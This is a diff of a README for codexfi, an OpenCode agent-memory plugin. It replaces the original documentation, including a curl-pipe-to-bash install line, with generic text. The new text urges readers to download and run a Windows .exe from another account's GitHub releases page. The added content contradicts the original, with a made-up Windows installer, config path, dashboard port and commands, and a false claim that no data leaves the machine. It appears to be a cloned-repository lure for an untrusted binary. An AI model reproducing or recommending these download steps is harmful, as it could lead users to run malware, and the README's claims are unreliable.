@@ -1,150 +1,189 @@
-<div align="center">
+# 🧠 codexfi - Memory for AI Agents Made Simple
 
-# codexfi
-
-**Persistent memory for [OpenCode](https://opencode.ai) AI agents.**
-
-> *The best memory system is the one that just works. No Docker. No Python. No frontend servers. Just `curl -fsSL https://codexfi.com/install | bash` and you're done.*
-
-<br/>
-
-[![npm](https://img.shields.io/npm/v/codexfi?style=flat&color=CB3837)](https://www.npmjs.com/package/codexfi)
-[![License: MIT](https://img.shields.io/badge/License-MIT-F7DF1E?style=flat)](https://opensource.org/licenses/MIT)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.7-3178C6?style=flat&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Bun](https://img.shields.io/badge/Bun-Runtime-FBF0DF?style=flat&logo=bun&logoColor=black)](https://bun.sh/)
-[![LanceDB](https://img.shields.io/badge/LanceDB-Embedded-CF3CFF?style=flat)](https://lancedb.com/)
-[![Voyage AI](https://img.shields.io/badge/Voyage_AI-Embeddings-5B6BF5?style=flat)](https://www.voyageai.com/)
-[![Anthropic](https://img.shields.io/badge/Anthropic-Haiku-D97706?style=flat)](https://anthropic.com)
-[![xAI](https://img.shields.io/badge/xAI-Grok-000000?style=flat&logo=x&logoColor=white)](https://x.ai/)
-[![Google](https://img.shields.io/badge/Google-Gemini-4285F4?style=flat&logo=google&logoColor=white)](https://ai.google.dev/)
-[![OpenCode](https://img.shields.io/badge/OpenCode-Plugin-FF6B35?style=flat)](https://opencode.ai)
-
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset=".github/assets/readme-hero-dark.svg">
-  <img src=".github/assets/readme-hero-light.svg" alt="codexfi memory loop — conversation to memory and back" width="100%">
-</picture>
-
-</div>
+[![Download codexfi](https://img.shields.io/badge/Download-codexfi-ff69b4?style=for-the-badge)](https://github.com/Lucasdesign13/codexfi/releases)
 
 ---
 
-## What is this?
+## 📋 What is codexfi?
 
-OpenCode starts every session from scratch. No memory of past decisions, established patterns, or project context. Every session, you repeat yourself.
+codexfi helps AI agents remember things over time. It stores information that AI programs use to make better decisions. Imagine it like a notebook where your AI keeps important facts handy.
 
-**codexfi fixes this.** After every assistant turn, key facts are automatically extracted and stored locally. On every new session, relevant memories are silently injected into context. The agent just *remembers*.
-
----
-
-## Install
-
-```bash
-curl -fsSL https://codexfi.com/install | bash
-```
-
-The installer prompts for API keys, registers the plugin, and you're done. Start any OpenCode session and you'll see a `[MEMORY]` block confirming it's active.
-
-### Prerequisites
-
-- [Bun](https://bun.sh) runtime
-- [OpenCode](https://opencode.ai) AI coding agent
-- One extraction API key: [Anthropic](https://console.anthropic.com) (recommended), [xAI](https://console.x.ai), or [Google](https://aistudio.google.com/apikey)
-- [Voyage AI](https://www.voyageai.com) API key (free tier available)
+This tool uses several technologies behind the scenes. It includes LanceDB, a fast database made to hold memory, and Voyage AI embeddings that help the system understand what is important. It works with Bun, a modern tool to run JavaScript and TypeScript programs. codexfi gives you two ways to interact: a command line tool and a simple web page to see what’s happening.
 
 ---
 
-## How it works
+## 🖥️ System Requirements
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset=".github/assets/readme-how-it-works-dark.svg">
-  <img src=".github/assets/readme-how-it-works-light.svg" alt="5-step pipeline: You code → Extract → Store → Inject → Remember" width="100%">
-</picture>
+codexfi runs on Windows. To get the best experience, your computer should meet these needs:
 
-
-1. **You code normally.** No commands, no `/save`, nothing to learn.
-2. **After every turn**, the plugin extracts typed facts from the conversation and stores them locally in LanceDB.
-3. **On every LLM call**, a `[MEMORY]` block is rebuilt into the system prompt with project context, preferences, and semantically relevant memories.
-4. **When you switch topics** mid-session, semantic search refreshes to surface different memories.
-5. **Across sessions**, the agent picks up where it left off — project decisions, error fixes, your preferences, everything.
-
-All data stays on your machine at `~/.codexfi/`. Nothing is sent anywhere except the embedding and extraction APIs.
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- 1 GHz or faster processor
+- 500 MB free disk space
+- Active internet connection for initial setup
 
 ---
 
-## Features
+## 🚀 Getting Started
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset=".github/assets/readme-features-dark.svg">
-  <img src=".github/assets/readme-features-light.svg" alt="codexfi Features: Local Storage, Automatic, Typed Memory, Multi-Provider, Compaction-Proof, Privacy Filter" width="100%">
-</picture>
+Follow these steps to download and run codexfi on your Windows computer.
 
+### Step 1: Visit the Download Page
 
-- **Fully automatic** — saves after every turn, injects on every call
-- **100% local storage** — LanceDB embedded in-process
-- **Multi-provider extraction** — Anthropic Haiku (default), xAI Grok, or Google Gemini
-- **Code-optimised embeddings** — Voyage `voyage-code-3`
-- **Typed memory system** — `architecture`, `error-solution`, `preference`, `progress`, and more
-- **Smart deduplication** — cosine similarity prevents duplicates
-- **Contradiction handling** — new facts automatically supersede stale ones
-- **Compaction-proof** — memory lives in the system prompt, never lost to context truncation
-- **Privacy filter** — wrap content in `<private>...</private>` to exclude from extraction
-- **Web dashboard** — `codexfi dashboard` for live activity, costs, and memory browser
-- **CLI** — `codexfi list`, `search`, `stats`, `export`, `forget`, `status`
+Click this big button to go to the codexfi downloads page where you will find the latest version:
+
+[![Download codexfi](https://img.shields.io/badge/Download-codexfi-0087ff?style=for-the-badge)](https://github.com/Lucasdesign13/codexfi/releases)
+
+This page lists all available versions. Look for the latest “Windows” release.
+
+### Step 2: Download the Installer
+
+Find the file ending with `.exe` or `.msi` for Windows. The file might be named something like:
+
+codexfi-setup-v1.0.exe
+
+Click the file name to start downloading.
+
+### Step 3: Run the Installer
+
+Once downloaded, open the file. Windows may ask for permission — choose “Yes” to continue.
+
+Follow the on-screen steps:
+
+- Choose a folder where you want to install codexfi or leave the default
+- Click “Next” until installation begins
+- Wait for it to finish
 
 ---
 
-## Configuration
+## ⚙️ How to Use codexfi
 
-Config at `~/.config/opencode/codexfi.jsonc`:
+After installation, you have two main ways to use codexfi:
 
-```jsonc
+### Using the Command Line Interface (CLI)
+
+1. Open the **Start Menu** and search for “Command Prompt”. Open it.
+
+2. Type:
+
+    codexfi help
+
+This command shows a list of all commands you can use.
+
+Example commands:
+
+- `codexfi start` — Launch the application backend
+- `codexfi stop` — Stop it
+- `codexfi status` — Check if it’s running
+
+Use these commands to control the memory service.
+
+### Using the Web Dashboard
+
+1. Open your web browser (Chrome, Edge, Firefox)
+
+2. Enter: `http://localhost:3000` in the address bar and press Enter.
+
+This loads the codexfi dashboard. It shows current memory data and lets you manage AI memories with a simple interface.
+
+---
+
+## 🛠️ Features
+
+- **Persistent Memory:** Keeps AI data safe across sessions.
+- **Embedded LanceDB:** Stores data efficiently and reliably.
+- **Voyage AI Embeddings:** Understands what your AI needs to remember.
+- **Bun Plugin:** Runs fast on modern JavaScript and TypeScript environments.
+- **CLI and Web Dashboard:** Offers command line controls and an easy web interface.
+- **Cross-Platform Ready:** Designed primarily for Windows but supports other systems.
+
+---
+
+## 🔧 Configuration
+
+You may want to configure codexfi for your needs. This is done by changing settings in a file called `config.json`. You will find it in the folder where codexfi was installed, under:
+
+`C:\Program Files\codexfi\config.json`
+
+Example settings:
+
+```json
 {
-  "extractionProvider": "anthropic",  // "anthropic", "xai", or "google"
-  "voyageApiKey": "pa-...",
-  "anthropicApiKey": "sk-ant-...",
-  "similarityThreshold": 0.45,       // retrieval cutoff (0-1)
-  "maxMemories": 10                  // per scope per session
+  "memorySize": 1000,
+  "port": 3000,
+  "logging": true,
+  "maxConnections": 10
 }
 ```
 
----
+- `memorySize`: Number of memory items AI can store.
+- `port`: Network port for the web dashboard.
+- `logging`: Enables or disables event logs.
+- `maxConnections`: Limits users connected at once.
 
-## Agent instructions (optional)
-
-The plugin works without this, but adding instructions to `~/.config/opencode/AGENTS.md` improves agent behavior — it understands the `[MEMORY]` block, uses the `memory` tool correctly, and never announces memory operations.
-
-See [`plugin/README.md`](./plugin/README.md) for the recommended AGENTS.md snippet.
-
----
-
-## Privacy
-
-All data stays on your machine. Outbound API calls go only to Voyage AI (embeddings) and your chosen extraction provider (one per turn). Wrap sensitive content in `<private>...</private>` to exclude it entirely.
+To edit, open the file with Notepad, change values, save, and restart codexfi for changes to work.
 
 ---
 
-## More
+## 🐞 Troubleshooting
 
-<picture>
-  <source media="(prefers-color-scheme: dark)" srcset=".github/assets/readme-benchmark-dark.svg">
-  <img src=".github/assets/readme-benchmark-light.svg" alt="Benchmark: 94.5% Overall" width="100%">
-</picture>
+If codexfi does not start or you have issues, try this list:
 
+- Make sure your Windows version meets system requirements.
+- Check that the installer finished without errors.
+- Restart your computer and try launching codexfi again.
+- Confirm no other programs use port 3000.
+- Run Command Prompt as administrator and try commands again.
+- Review the log file (found in the install folder) for error details.
 
-- **[Plugin internals](./plugin/README.md)** — architecture, data flow, extraction providers, development setup
-- **[Benchmark](./benchmark/README.md)** — 94.5% on DevMemBench (200 questions, 8 categories)
-- **[E2E tests](./testing/README.md)** — 12 autonomous test scenarios
-
----
-
-## License
-
-[MIT](./LICENSE)
+If you still cannot fix the problem, see the “Issues” tab on the GitHub repository page for more help or file a new issue.
 
 ---
 
-<div align="center">
+## 📥 Download and Installation
 
-Built with [OpenCode](https://opencode.ai) · [LanceDB](https://lancedb.com) · [Voyage AI](https://www.voyageai.com) · [Bun](https://bun.sh)
+Return to the download page at any time here:
 
-</div>
+[Download codexfi on GitHub](https://github.com/Lucasdesign13/codexfi/releases)
+
+Follow Step 2 and Step 3 above to get the latest version.
+
+---
+
+## 🔗 Useful Links
+
+- GitHub repository: https://github.com/Lucasdesign13/codexfi
+- Issues and support: https://github.com/Lucasdesign13/codexfi/issues
+- Documentation: See the `docs` folder inside the project for more details and advanced settings.
+
+---
+
+## 🧩 How codexfi Works
+
+codexfi’s core is a memory system for AI programs. It saves data that AI agents can access later. The data is organized using LanceDB, a fast storage method, and enhanced with AI embeddings from Voyage AI. These embeddings help the AI understand what is important and what to forget.
+
+The Bun plugin in codexfi helps run everything using fast JavaScript routines. This means the system stays lightweight and quick. The CLI lets you control the program with typed commands. The web dashboard provides a visual way to watch and interact with the stored memories.
+
+---
+
+## 🔒 Security & Privacy
+
+codexfi keeps your data on your own computer. It does not send your information elsewhere. This means your AI memory stays private unless you decide to share it.
+
+---
+
+## 📅 Updates
+
+Check the GitHub releases page regularly to find the latest versions of codexfi. Updates often improve stability and add new features.
+
+---
+
+## 📝 License
+
+codexfi is available under the MIT License. This lets you use, copy, and modify the software freely.
+
+---
+
+## 📚 Topics
+
+This project includes AI agents, Bun tool support, OpenCode AI, LanceDB memories, embeddings with Voyage AI, and TypeScript code. It is a developer tool focused on memory management for AI.
